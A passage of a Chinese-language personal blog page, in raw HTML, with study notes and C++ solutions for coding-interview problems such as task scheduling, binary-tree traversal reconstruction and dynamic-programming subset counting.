//不用char，有一个10</span><br><span class="line">    for(int i=0;i&lt;13;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;a13[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   // zhuanhuan1(a13);</span><br><span class="line">   // sort(a13.begin(),a13.end(),cmp);</span><br><span class="line">    </span><br><span class="line">    vector&lt;string&gt; conv(13,&quot;&quot;);//比较下标就好啦</span><br><span class="line">    for(int i=0;i&lt;13;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(a13[i]==&quot;J&quot;) conv[9]=&quot;J&quot;;</span><br><span class="line">        else if(a13[i]==&quot;Q&quot;)  conv[10]=&quot;Q&quot;;</span><br><span class="line">        else if(a13[i]==&quot;K&quot;)   conv[11]=&quot;K&quot;;</span><br><span class="line">        else if(a13[i]==&quot;A&quot;)    conv[12]=&quot;A&quot;;</span><br><span class="line">        else </span><br><span class="line">        &#123;</span><br><span class="line">            conv[stoi(a13[i])-2]=a13[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    shunzi(conv);</span><br><span class="line"></span><br><span class="line">    // zhuanhuan2(a13);</span><br><span class="line">    // for(auto a:a13)</span><br><span class="line">    // cout&lt;&lt;a&lt;&lt;&quot; &quot;;</span><br><span class="line">    //</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>2 9 J 10 3 4 K A 7 Q A 5 6<br>3 4 5 6 7<br>9 10 J Q K A</p>
</blockquote>
<p>当然，还有一种情况还有&#x2F;&#x2F;2 2 3 3 4 4 5 5 6 6 7 7 8 ，这个不是可以分成两个顺子嘛</p>
<p>看来还是得记录下对应值的次数吧。</p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="n台阶"><a href="#n台阶" class="headerlink" title="n台阶"></a>n台阶</h2><p>一共有n个台阶，一次走1步或3步，有多少种方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int ss(int n)</span><br><span class="line">&#123;</span><br><span class="line">	if(n==1) return 1;</span><br><span class="line">	else if(n==2) return 1;</span><br><span class="line">	else if(n==3) return 2;</span><br><span class="line"></span><br><span class="line">	return ss(n-1)+ss(n-3);</span><br><span class="line">&#125;</span><br><span class="line">void s1(int n)</span><br><span class="line">&#123;</span><br><span class="line">	int step1=1,step2=1,step3=2;</span><br><span class="line">	if(n==1||n==2) cout&lt;&lt;1;</span><br><span class="line">	if(n==3) cout&lt;&lt;2;</span><br><span class="line">	int step4;</span><br><span class="line">	for(int i=4;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		step4=step3+step1;</span><br><span class="line">		step1=step2;</span><br><span class="line">		step2=step3;</span><br><span class="line">		step3=step4;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;step4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="任务调度"><a href="#任务调度" class="headerlink" title="任务调度"></a>任务调度</h2><p>顺延思想</p>
<h3 id="题目描述-27"><a href="#题目描述-27" class="headerlink" title="题目描述"></a>题目描述</h3><p>为了充分发挥<code>GPU</code>算力，<br>需要尽可能多的将任务交给<code>GPU</code>执行，<br>现在有一个任务数组，<br>数组元素表示在这<code>1s</code>内新增的任务个数，<br>且每秒都有新增任务，<br>假设<code>GPU</code>最多一次执行<code>n</code>个任务，<br>一次执行耗时<code>1s</code>，<br>在保证<code>GPU</code>不空闲的情况下，最少需要多长时间执行完成。</p>
<h3 id="输入描述-36"><a href="#输入描述-36" class="headerlink" title="输入描述"></a>输入描述</h3><p>第一个参数为<code>GPU</code>最多执行的任务个数，取值范围<code>1 ~ 10000</code><br>第二个参数为任务数组的长度，取值范围<code>1 ~ 10000</code><br>第三个参数为任务数组，数字范围<code>1 ~ 10000</code></p>
<h3 id="输出描述-36"><a href="#输出描述-36" class="headerlink" title="输出描述"></a>输出描述</h3><p>执行完所有任务需要多少秒</p>
<h3 id="示例一-22"><a href="#示例一-22" class="headerlink" title="示例一"></a>示例一</h3><h4 id="输入-33"><a href="#输入-33" class="headerlink" title="输入"></a>输入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">5</span><br><span class="line">1 2 3 4 5</span><br></pre></td></tr></table></figure>

<h4 id="输出-32"><a href="#输出-32" class="headerlink" title="输出"></a>输出</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void solution(int n,vector&lt;int&gt; a)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	int time=0,remain=0;</span><br><span class="line">	for(int i=0;i&lt;a.size();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if(a[i]+remain&gt;n)//这个是上个任务剩下的任务与当前任务总和</span><br><span class="line">		&#123;</span><br><span class="line">			remain=a[i]+remain-n;//有剩余</span><br><span class="line">			time++;//先执行完n个，即过了1s</span><br><span class="line">		&#125;</span><br><span class="line">		else //总任务数&lt;=n</span><br><span class="line">		&#123;</span><br><span class="line">			time++;</span><br><span class="line">			remain=0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	//比如4个任务剩下了1个，与下5个任务一起执行</span><br><span class="line">		//6-3=3;</span><br><span class="line">		time+=remain/n; //处理剩余</span><br><span class="line">		if(remain%n&gt;0) time++;</span><br><span class="line">	cout&lt;&lt;time;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="最大资金额"><a href="#最大资金额" class="headerlink" title="最大资金额"></a>最大资金额</h2><p>给一堆商品，价格不一，限购n样，有金额m，求最大花费</p>
<p>知识点：全排列组合，其实可以三指针，排序后，一个从最左边开始，一个从最右边和次右边开始</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void quanpai(vector&lt;int&gt; a,int start);</span><br><span class="line">vector&lt;vector&lt;int&gt;&gt; combines;</span><br><span class="line">void so(vector&lt;int&gt; s,int num)</span><br><span class="line">&#123;</span><br><span class="line">	sort(s.begin(),s.end());</span><br><span class="line">	if(s.size()&lt;3||s[0]+s[1]+s[2]&gt;num)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;&quot;-1&quot;;</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	quanpai(s,0);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">vector&lt;int&gt; cm;</span><br><span class="line"></span><br><span class="line">void quanpai(vector&lt;int&gt; a,int start)</span><br><span class="line">&#123;</span><br><span class="line">	if(cm.size()==3)</span><br><span class="line">	&#123;</span><br><span class="line">		combines.push_back(cm);</span><br><span class="line">		//cm.clear();不用清除</span><br><span class="line">			return;</span><br><span class="line">	&#125;</span><br><span class="line">	for(int i=start;i&lt;a.size();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cm.push_back(a[i]);</span><br><span class="line">		//cout&lt;&lt;a[i]&lt;&lt;endl;</span><br><span class="line">		quanpai(a,i+1);</span><br><span class="line">		cm.pop_back();//移除最后一个</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="最小步骤"><a href="#最小步骤" class="headerlink" title="最小步骤"></a>最小步骤</h2><h3 id="题目描述-28"><a href="#题目描述-28" class="headerlink" title="题目描述"></a>题目描述</h3><p>一个正整数数组，设为<code>nums</code><br>最大为<code>100</code>个成员<br>求从第一个成员开始正好走到数组最后一个成员所使用的最小步骤数</p>
<p>要求：</p>
<ol>
<li>第一步，必须从第一元素起，且<code>1 &lt;= 第一步步长 &lt; len / 2</code> (len为数组长度)</li>
<li>从第二步开始只能以所在成员的数字走相应的步数，不能多不能少，如果目标不可达返回<code>-1</code>，只输出最小的步骤数量</li>
<li>只能向数组的尾部走不能向回走</li>
</ol>
<h3 id="输入描述-37"><a href="#输入描述-37" class="headerlink" title="输入描述"></a>输入描述</h3><p>一个正整数数组，元素用<code>空格</code>分割<br><code>数组长度 &lt; 100</code></p>
<h3 id="输出描述-37"><a href="#输出描述-37" class="headerlink" title="输出描述"></a>输出描述</h3><p>正整数，最小步数<br>不存在输出<code>-1</code></p>
<h3 id="示例一-23"><a href="#示例一-23" class="headerlink" title="示例一"></a>示例一</h3><h4 id="输入-34"><a href="#输入-34" class="headerlink" title="输入"></a>输入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7 5 9 4 2 6 8 3 5 4 3 9</span><br></pre></td></tr></table></figure>

<h4 id="输出-33"><a href="#输出-33" class="headerlink" title="输出"></a>输出</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure>

<h4 id="说明-7"><a href="#说明-7" class="headerlink" title="说明"></a>说明</h4><p>第一个可选步长选择<code>2</code><br>从第一个成员<code>7</code>开始走两步到<code>9</code><br>第二步从<code>9</code>经过<code>9</code>个成员到最后</p>
<h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><p>1.第一步只能走1到len&#x2F;2步，从它开始遍历，step默认为1了</p>
<p>2.递归遍历，walk(int curpos,int lastpos)，判断lastpos是否是最后一个索引，是就返回step，如果小于呢，继续递归，从lastpos，走lasepos+a[curpos]步，step++;</p>
<p>3.set记录能够到最后一个索引的所需步骤数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;int&gt; a;</span><br><span class="line">int step;</span><br><span class="line">int walk(int curpos,int lastpos)</span><br><span class="line">&#123;</span><br><span class="line">	int num=a[curpos];</span><br><span class="line">	if(lastpos==a.size()-1) return step;</span><br><span class="line">	else if(lastpos&lt;a.size()-1)</span><br><span class="line">	&#123;</span><br><span class="line">		step++;</span><br><span class="line">		return walk(lastpos,lastpos+num);//在lastpos走num步</span><br><span class="line">	&#125;</span><br><span class="line">	else return -1;</span><br><span class="line">&#125;</span><br><span class="line">void solu1(vector&lt;int&gt; a)</span><br><span class="line">&#123;</span><br><span class="line">	int n=a.size();</span><br><span class="line">	set&lt;int&gt; set1;</span><br><span class="line">	</span><br><span class="line">	for(int i=1;i&lt;n/2;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		step=1;</span><br><span class="line">		set1.insert(walk(i,i));</span><br><span class="line">	&#125;</span><br><span class="line">	if(set1.size()!=1)//不止一条路径，那就将-1去掉</span><br><span class="line">	&#123;</span><br><span class="line">		auto a=set1.begin();//迭代器访问</span><br><span class="line">		set1.erase(*a);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	for(auto aa:set1)</span><br><span class="line">	cout&lt;&lt;aa&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="二叉树层次遍历"><a href="#二叉树层次遍历" class="headerlink" title="二叉树层次遍历"></a>二叉树层次遍历</h1><h2 id="题目描述-29"><a href="#题目描述-29" class="headerlink" title="题目描述"></a>题目描述</h2><p>有一棵二叉树<br>每一个节点用一个大写字母标识<br>最多<code>26</code>个节点<br>现有两组字母<br>分别表示<code>后序遍历</code>（左孩子指向右孩子指向父节点）<br>和<code>中序遍历</code>（左孩子指向父节点指向右孩子）<br>请输出<code>层次遍历</code>的结果</p>
<h2 id="输入描述-38"><a href="#输入描述-38" class="headerlink" title="输入描述"></a>输入描述</h2><p>输入为两个字符串<br>分别为二叉树的后序遍历和中序遍历结果</p>
<h2 id="输出描述-38"><a href="#输出描述-38" class="headerlink" title="输出描述"></a>输出描述</h2><p>输出二叉树的层次遍历结果</p>
<h2 id="示例一-24"><a href="#示例一-24" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-35"><a href="#输入-35" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CBEFDA CBAEDF</span><br></pre></td></tr></table></figure>

<h3 id="输出-34"><a href="#输出-34" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ABDCEF</span><br></pre></td></tr></table></figure>

<h2 id="代码-噢，这是前序遍历输出"><a href="#代码-噢，这是前序遍历输出" class="headerlink" title="代码(噢，这是前序遍历输出)"></a>代码(噢，这是前序遍历输出)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unordered_map&lt;char,int&gt; mp;</span><br><span class="line">void cengxu(string s1,int posts,int poste,string s2,int mids,int mide)</span><br><span class="line">&#123;</span><br><span class="line">   // if(poste==0) return;</span><br><span class="line">   if(posts&gt;poste) return;</span><br><span class="line">    int rootpos=mp[s1[poste]];</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;&quot;root: &quot;&lt;&lt;s2[rootpos]&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">   // cengxu(s1,0,rootpos-1,s2,0,rootpos-1);</span><br><span class="line">    cengxu(s1,posts,posts+rootpos-mids-1,s2,mids,rootpos-1);</span><br><span class="line">    //cengxu(s1,rootpos,poste-1,s2,rootpos+1,mide);</span><br><span class="line">    cengxu(s1,posts+rootpos-mids,poste-1,s2,rootpos+1,mide);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    string a,b;</span><br><span class="line">    cin&gt;&gt;a;</span><br><span class="line">    cin&gt;&gt;b;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    for(int i=0;i&lt;b.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        mp[b[i]]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    cengxu(a,0,a.size()-1,b,0,b.size()-1);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="代码2"><a href="#代码2" class="headerlink" title="代码2"></a>代码2</h2><p>先用结构体接收根，左，右</p>
<p>再层序输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;map&gt;</span><br><span class="line">#include&lt;queue&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">struct Node&#123;</span><br><span class="line">    char data;</span><br><span class="line">    Node* left;</span><br><span class="line">    Node* right;</span><br><span class="line">    Node(char x):data(x),left(nullptr),right(nullptr)&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">map&lt;char,int&gt; mp;</span><br><span class="line">Node* create(string s1,int posts,int poste,string s2,int mids,int mide)</span><br><span class="line">&#123;</span><br><span class="line">   // if(poste==0) return;</span><br><span class="line">   if(posts&gt;poste||mids&gt;mide) return nullptr;</span><br><span class="line">    char rootdata=s1[poste];</span><br><span class="line">    int rootpos=mp[rootdata];</span><br><span class="line"></span><br><span class="line">  //  cout&lt;&lt;&quot;root: &quot;&lt;&lt;s2[rootpos]&lt;&lt;endl;</span><br><span class="line">    Node* root=new Node(rootdata);</span><br><span class="line"></span><br><span class="line">    root-&gt;left= create(s1,posts,posts+rootpos-mids-1,s2,mids,rootpos-1);</span><br><span class="line"></span><br><span class="line">    root-&gt;right=create(s1,posts+rootpos-mids,poste-1,s2,rootpos+1,mide);</span><br><span class="line">    return root;</span><br><span class="line">&#125; </span><br><span class="line">void cengxu(Node* root)</span><br><span class="line">&#123;</span><br><span class="line">    if(root==nullptr) return;</span><br><span class="line">    </span><br><span class="line">    queue&lt;Node*&gt;q;</span><br><span class="line">    q.push(root);</span><br><span class="line"></span><br><span class="line">    while(!q.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        Node* cur=q.front();</span><br><span class="line">        q.pop();</span><br><span class="line">        cout&lt;&lt;cur-&gt;data&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">        if(cur-&gt;left) q.push(cur-&gt;left);</span><br><span class="line">        if(cur-&gt;right) q.push(cur-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    string a,b;</span><br><span class="line">    cin&gt;&gt;a;</span><br><span class="line">    cin&gt;&gt;b;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    for(int i=0;i&lt;b.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        mp[b[i]]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    Node* node=create(a,0,a.size()-1,b,0,b.size()-1);</span><br><span class="line">    cengxu(node);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="wp-5"><a href="#wp-5" class="headerlink" title="wp"></a>wp</h2><blockquote>
<p>error: cannot call member function ‘Tree* Tree::create(std::__cxx11::string, std::__cxx11::string)’ without object<br>    Tree* t&#x3D;Tree::create(a,b);</p>
<p>表明您正在尝试调用该类的成员函数而不需要<code>Tree</code>对象创建类的实例。该方法前加个static</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Node&#123;</span><br><span class="line"></span><br><span class="line">    char data;</span><br><span class="line">    Node* left;</span><br><span class="line">    Node* right;</span><br><span class="line">    Node(char x):data(x),left(nullptr),right(nullptr)&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">class Tree&#123;</span><br><span class="line">//private:</span><br><span class="line">  </span><br><span class="line">public:</span><br><span class="line">    Node* root;</span><br><span class="line">    Tree():root(nullptr)&#123;&#125;</span><br><span class="line"></span><br><span class="line">    static Tree* create(string post,string in)&#123;</span><br><span class="line">        Tree* res=new Tree();</span><br><span class="line">        res-&gt;root=create(post,0,post.size()-1,in,0,in.size()-1);</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line">    static Node* create(string post,int s1,int e1,string in,int s2,int e2)&#123;</span><br><span class="line">        if(s1&gt;e1||s2&gt;e2)</span><br><span class="line">        &#123;</span><br><span class="line">            return nullptr;</span><br><span class="line">        &#125;</span><br><span class="line">       Node* root=new Node(post[e1]);</span><br><span class="line">       for(int i=s2;i&lt;=e2;i++)</span><br><span class="line">       &#123;</span><br><span class="line">        if(post[e1]==in[i])</span><br><span class="line">        &#123;</span><br><span class="line">            root-&gt;left=create(post,s1,s1+i-s2-1,in,s2,i-1);</span><br><span class="line">            root-&gt;right=create(post,s1+i-s2,e1-1,in,i+1,e2);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">       &#125; </span><br><span class="line">       return root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">void cengxu(Node* root)</span><br><span class="line">&#123;</span><br><span class="line">    if(root==nullptr) return;</span><br><span class="line">    queue&lt;Node*&gt; q;</span><br><span class="line">    q.push(root);</span><br><span class="line">    while(!q.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        Node* node=q.front();</span><br><span class="line">        cout&lt;&lt;node-&gt;data&lt;&lt;endl;</span><br><span class="line">        q.pop();</span><br><span class="line">        if(node-&gt;left!=nullptr) q.push(node-&gt;left);</span><br><span class="line">        if(node-&gt;right!=nullptr) q.push(node-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    string a,b;</span><br><span class="line">    cin&gt;&gt;a;</span><br><span class="line">    cin&gt;&gt;b;</span><br><span class="line"></span><br><span class="line">   Tree* t=Tree::create(a,b);</span><br><span class="line">   cengxu(t-&gt;root);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="代表团坐车"><a href="#代表团坐车" class="headerlink" title="代表团坐车"></a>代表团坐车</h1><p><strong>动态规划</strong></p>
<h2 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h2><p>现在要举行一场会议，有很多代表团参加。但是他们可能在同一个时间到达，而负责接待它们的接待处只有一辆车，现在为了提高车辆利用率，请帮接待员计算可以坐满车的接待方案，输出方案数量</p>
<p>限制：</p>
<p>1.一个团只能上一辆车，并且代表团数量小于汽车容量</p>
<p>2.需要将车坐满</p>
<h2 id="输入描述-39"><a href="#输入描述-39" class="headerlink" title="输入描述"></a>输入描述</h2><p>第一行 代表团人数，英文逗号分割，代表团数量&lt;30，每个代表团人数&lt;30</p>
<p>第二行 汽车载客量 &lt;100</p>
<h2 id="输出描述-39"><a href="#输出描述-39" class="headerlink" title="输出描述"></a>输出描述</h2><p>坐满汽车的方案数量，无解输出0</p>
<h2 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h2><p>输入 </p>
<p>5,4,2,3,2,4,9</p>
<p>10</p>
<p>输出 4</p>
<p>说明:[2,3,5] [2,4,4] [2,3,5] [2,4,4]</p>
<h2 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;sstream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int fangan(vector&lt;int&gt; a,int n)</span><br><span class="line">&#123;</span><br><span class="line">    // if(n==0) ans[0][0]=1;</span><br><span class="line">    // if(n&gt;0) ans[0][n]=0;</span><br><span class="line">    int m=a.size();</span><br><span class="line">    vector&lt;int&gt; dp(n+1,0);//dp[i] 车容量为i时的方案数</span><br><span class="line">    dp[0]=1;</span><br><span class="line">    for (int i = 0; i &lt; m; i++)</span><br><span class="line">    for(int j=n;j&gt;=a[i];j--)</span><br><span class="line">    &#123;</span><br><span class="line">        dp[j]+=dp[j-a[i]];</span><br><span class="line">    &#125;</span><br><span class="line">    return dp[n];</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    /*</span><br><span class="line">    5,4,2,3,2,4,9</span><br><span class="line">    10</span><br><span class="line">    */</span><br><span class="line">    </span><br><span class="line">    string t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    stringstream ss(t);</span><br><span class="line">    string s;</span><br><span class="line">    vector&lt;int&gt; v;</span><br><span class="line">    while(getline(ss,s,&#x27;,&#x27;))</span><br><span class="line">    &#123;</span><br><span class="line">        v.push_back(stoi(s));</span><br><span class="line">    &#125;</span><br><span class="line">    int n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">   // sort(v.begin(),v.end());</span><br><span class="line">    int size=v.size();</span><br><span class="line">    //int ans[size+1][n+1];//在ans[i][j],nums选取前i个元素，和为j的方案数</span><br><span class="line">    </span><br><span class="line">    // for(auto a:v)</span><br><span class="line">    // cout&lt;&lt;a&lt;&lt;&quot; &quot;;</span><br><span class="line">    cout&lt;&lt;fangan(v,n);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="贪心："><a href="#贪心：" class="headerlink" title="贪心："></a>贪心：</h1><h2 id="调整座位"><a href="#调整座位" class="headerlink" title="调整座位"></a>调整座位</h2><p>两人之间至少有一空位，0表示座位空闲，1表示占据，不改变原有座位秩序的情况下，还可以安排坐几人</p>
<p>数组desk.length&lt;&#x3D;2*10⁴</p>
<p>输入：</p>
<p>占座情况</p>
<p>1,0,0,0,1</p>
<p>输出：</p>
<p>根据当前情况，还能坐多少人</p>
<p>1 即desk[2]可以坐一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(int i=1;i&lt;a.size();i++)</span><br><span class="line">   &#123;</span><br><span class="line">       if(a[i-1]==0&amp;&amp;a[i]==0&amp;&amp;a[i+1]==0)</span><br><span class="line">       &#123;</span><br><span class="line">           a[i]=1;</span><br><span class="line">           co++;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   cout&lt;&lt;co;</span><br></pre></td></tr></table></figure>

<h1 id="动规"><a href="#动规" class="headerlink" title="动规"></a>动规</h1><p>这个按csdn目录来的，它规定了每道题的知识点，比如动态规划，但有的题，我实在看不出动规，没有用动规就表明了其他方法</p>
<h2 id="跳格子"><a href="#跳格子" class="headerlink" title="跳格子"></a>跳格子</h2><p>有n个连续格子，但是首尾相连，组成一个圈，可以从任意格子跳，但：</p>
<p>1.连续的格子不挑</p>
<p>2.不能回头跳</p>
<p>计算最高分</p>
<p>输入 2 3 2</p>
<p>输出 3</p>
<p>输入 1 2 3 1</p>
<p>输出 4  （1+3）</p>
<p>思想：</p>
<p>环状情况，分类讨论</p>
<p>先同时查看两个相邻格子，选较大的那个</p>
<p>第一格子和最后一格子只能选择一个</p>
<p>比较0<del>n-2 和1</del>n-1的最终结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int rob1(vector&lt;int&gt;&amp;nums,int s,int e)</span><br><span class="line">&#123;</span><br><span class="line">    int first=nums[s],second=max(nums[s],nums[s+1]);</span><br><span class="line">    for(int i=s+2;i&lt;=e;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        int temp=second;</span><br><span class="line">        second=max(first+nums[i],second);//</span><br><span class="line">        first=temp;</span><br><span class="line">        </span><br><span class="line">        //相当于dp[i]=max(dp[i-1],dp[i-2]+nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return second;</span><br><span class="line">&#125;</span><br><span class="line">    int rob(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        int len=nums.size();</span><br><span class="line">        if(len==1) return nums[0];</span><br><span class="line">        else if(len==2) return max(nums[0],nums[1]);</span><br><span class="line"></span><br><span class="line">        return max(rob1(nums,0,len-2),rob1(nums,1,len-1));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int rob1(vector&lt;int&gt; nums,int s,int e)</span><br><span class="line">   &#123;</span><br><span class="line">       int len=nums.size();</span><br><span class="line">         vector&lt;int&gt; dp(len+2);//定义为从第i间房子抢，最多的钱为dp[i]</span><br><span class="line">     //  0~n-1</span><br><span class="line">       dp[len]=0;</span><br><span class="line">       for(int i=e;i&gt;=s;i--)</span><br><span class="line">       &#123;</span><br><span class="line">           dp[i]=max(dp[i+2]+nums[i],dp[i+1]);</span><br><span class="line">       &#125;</span><br><span class="line">   </span><br><span class="line">       return dp[s];</span><br><span class="line">   &#125;</span><br><span class="line">   int rob(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">       int len=nums.size();</span><br><span class="line">       if(len==1) return nums[0];</span><br><span class="line">       else if(len==2) return max(nums[0],nums[1]);</span><br><span class="line"></span><br><span class="line">       return max(rob1(nums,0,len-2),rob1(nums,1,len-1));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h2 id="雨花石"><a href="#雨花石" class="headerlink" title="雨花石"></a>雨花石</h2><p>n个不同重量的雨花石，两人平分，重量相等</p>
<p>输入 </p>
<p>4  个数n </p>
<p>1 1 2 2  n个不同重量 m[k]&lt;1001</p>
<p>输出</p>
<p>2 从当前雨花石取出的最少数量，or -1</p>
<p>定义dp[i][j]，i个石头里，重量为j时至少取走a[i][j]个</p>
<p>a[0][j]&#x3D;n;(j&#x3D;1~avg)&#x2F;&#x2F;记为取无穷个</p>
<p>如果取的重量为m的石头，比j大，等于没操作，a[i][j]&#x3D;a[i-1][j];</p>
<p>每取走一个重量为m的石头，次数更新为dp[i][j-m]+1</p>
<p>dp[i][j]等于上面两情况取min</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;sstream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int pingfen(vector&lt;int&gt; nums,int m)</span><br><span class="line">&#123;</span><br><span class="line">    if(m%2!=0) return -1;</span><br><span class="line">    int n=nums.size();</span><br><span class="line">    int avg=m/2;</span><br><span class="line">    vector&lt;vector&lt;int&gt; &gt; dp(n+1,vector&lt;int&gt;(avg+1));//有i个石头，使得总重量为j，至少取a[i][j]次，使得总重量为0</span><br><span class="line">    for(int i=1;i&lt;=avg;i++) //取0个石头，使得重量为i的次数</span><br><span class="line">    &#123;</span><br><span class="line">          dp[0][i]=n;//即无穷次</span><br><span class="line">    &#125;</span><br><span class="line">      for (int i = 1; i &lt;= n; i++) &#123;//取第i块石头</span><br><span class="line">            int num = nums[i - 1];</span><br><span class="line">            for (int j = 1; j &lt;= avg; j++) &#123;//i个石头的重量</span><br><span class="line">                if (j &lt; num) &#123; //当前石头重量大于j，</span><br><span class="line">                    dp[i][j] = dp[i - 1][j];//则无法放入这个石头</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    /*</span><br><span class="line">                    两个选择</span><br><span class="line">                    1.不放入该石头，沿用之前的式子</span><br><span class="line">                    2.放入该石头，那么总重量减少</span><br><span class="line">                    +1，说明使用了该石头，石头个数+1</span><br><span class="line">                    3.要最少的石头个数嘛</span><br><span class="line">                    */</span><br><span class="line">                    dp[i][j] =min(dp[i - 1][j], dp[i - 1][j - num] + 1);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(dp[n][avg]==n) return -1;</span><br><span class="line">        else return dp[n][avg];</span><br><span class="line">      </span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">    // string s;</span><br><span class="line">    // cin&gt;&gt;s;</span><br><span class="line">    int n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">      vector&lt;int&gt; a(n);</span><br><span class="line">    int m=0;</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">        